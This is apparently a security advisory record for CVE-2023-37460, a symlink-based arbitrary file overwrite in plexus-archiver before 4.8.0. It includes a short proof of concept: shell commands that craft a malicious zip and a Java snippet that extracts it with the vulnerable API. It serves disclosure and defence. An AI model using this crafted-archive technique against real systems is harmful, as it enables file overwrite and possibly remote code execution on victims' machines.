{"hash":"c523821a855111cb531c450c4dfcb98fe191905a","data":{"post":{"title":"Plexus Archiver arbitrary file overwrite","path":"/vulnerabilities/plexus-archiver-arbitrary-file-overwrite-xray-526292/","content":"<h2 id=\"summary\"><a href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\">Summary</a></h2>\n<p>Using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution</p>\n<h2 id=\"component\"><a href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\">Component</a></h2>\n<p>org.codehaus.plexus:plexus-archiver</p>\n<h2 id=\"affected-versions\"><a href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\">Affected versions</a></h2>\n<p>(,4.8.0)</p>\n<h2 id=\"description\"><a href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\">Description</a></h2>\n<p>Plexis Archiver is a collection of <strong>Plexus</strong> components to create archives or extract archives to a directory with a unified <code>Archiver</code>/<code>UnArchiver</code> API. Prior to version 4.8.0, using AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution. When extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the <code>resolveFile()</code> function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later <code>Files.newOutputStream()</code>, that follows symlinks by default, will actually write the entry's content to the symlink's target. Whoever uses <strong>plexus</strong> archiver to extract an untrusted archive is vulnerable to an arbitrary file creation and possibly remote code execution. Version 4.8.0 contains a patch for this issue.</p>\n<h2 id=\"poc\"><a href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\">PoC</a></h2>\n<p>Creating the \"malicious\" archive -</p>\n<pre><code>$ ln -s /tmp/target entry1\n$ echo -ne “content” > entry2\n$ zip  --symlinks archive.zip entry1 entry2\n$ sed -i 's/entry2/entry1/' archive.zip\n</code></pre>\n<p>Vulnerable code snippet -</p>\n<pre><code>package com.example;\n\nimport java.io.File;\nimport org.codehaus.plexus.archiver.zip.ZipUnArchiver;\n\npublic class App \n{\n    public static void main( String[] args )\n    {\n        ZipUnArchiver unArchiver = new ZipUnArchiver(new File(\"archive.zip\"));\n        unArchiver.setDestDirectory(new File(\"/tmp/extracted_files\"));\n        unArchiver.extract();        \n    }\n}\n</code></pre>\n<h2 id=\"vulnerability-mitigations\"><a href=\"#vulnerability-mitigations\" aria-hidden=\"true\" tabindex=\"-1\">Vulnerability Mitigations</a></h2>\n<p>No mitigations are supplied for this issue</p>\n<h2 id=\"references\"><a href=\"#references\" aria-hidden=\"true\" tabindex=\"-1\">References</a></h2>\n<p><a href=\"https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m</a></p>\n","description":"CVE-2023-37460, High, Plexus Archiver arbitrary file overwrite","date_published":"2023-07-26","xray_id":"XRAY-526292","vul_id":"CVE-2023-37460","severity":"high","discovered_by":"Uriya Yavnieli","last_updated":"2023-07-26","cvss":8.1}},"context":{}}